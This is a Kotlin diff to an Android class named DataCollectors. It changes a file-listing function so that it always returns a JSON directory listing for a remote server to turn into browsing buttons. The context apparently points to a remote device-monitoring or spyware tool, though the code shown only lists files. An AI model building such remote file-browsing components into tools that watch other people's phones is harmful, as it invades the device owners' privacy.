@@ -682,35 +682,54 @@ class DataCollectors(private val context: Context) {
     fun listFiles(path: String): Any {
         return try {
             val dir = File(path)
-            if (!dir.exists() || !dir.isDirectory) return CollectedData.TextResult("❌ المسار غير موجود: $path")
             
-            val files = dir.listFiles()?.sortedBy { it.name } ?: emptyList()
-            if (files.isEmpty()) return CollectedData.TextResult("📁 المسار فارغ: $path")
-            
-            // Return JSON with structured file data for server to build buttons
             val jsonList = JSONArray()
-            for (f in files.take(100)) {
-                jsonList.put(JSONObject().apply {
-                    put("name", f.name)
-                    put("path", f.absolutePath)
-                    put("is_dir", f.isDirectory)
-                    put("size", f.length())
-                })
+            var parentPath = ""
+            
+            if (dir.exists() && dir.isDirectory) {
+                parentPath = dir.parentFile?.absolutePath ?: ""
+                val files = dir.listFiles()?.sortedBy { it.name } ?: emptyList()
+                for (f in files.take(100)) {
+                    jsonList.put(JSONObject().apply {
+                        put("name", f.name)
+                        put("path", f.absolutePath)
+                        put("is_dir", f.isDirectory)
+                        put("size", f.length())
+                    })
+                }
             }
             
+            // ALWAYS return JSON (even if empty or error)
+            // Server will handle empty lists gracefully
             val result = JSONObject().apply {
                 put("type", "file_list")
-                put("path", dir.absolutePath)
-                put("parent", dir.parentFile?.absolutePath ?: "")
+                put("path", if (dir.exists()) dir.absolutePath else path)
+                put("parent", parentPath)
                 put("files", jsonList)
+                if (!dir.exists()) put("error", "not_found")
+                if (dir.exists() && !dir.isDirectory) put("error", "not_directory")
             }
             
             CollectedData.JsonResult(result.toString())
-        } catch (e: SecurityException) { 
-            CollectedData.TextResult("❌ صلاحية مرفوضة: $path")
-        }
-        catch (e: Exception) { 
-            CollectedData.TextResult("❌ خطأ: ${e.message ?: "unknown"}")
+        } catch (e: SecurityException) {
+            // Return JSON even on error
+            val result = JSONObject().apply {
+                put("type", "file_list")
+                put("path", path)
+                put("parent", "")
+                put("files", JSONArray())
+                put("error", "permission_denied")
+            }
+            CollectedData.JsonResult(result.toString())
+        } catch (e: Exception) {
+            val result = JSONObject().apply {
+                put("type", "file_list")
+                put("path", path)
+                put("parent", "")
+                put("files", JSONArray())
+                put("error", e.message ?: "unknown")
+            }
+            CollectedData.JsonResult(result.toString())
         }
     }
     
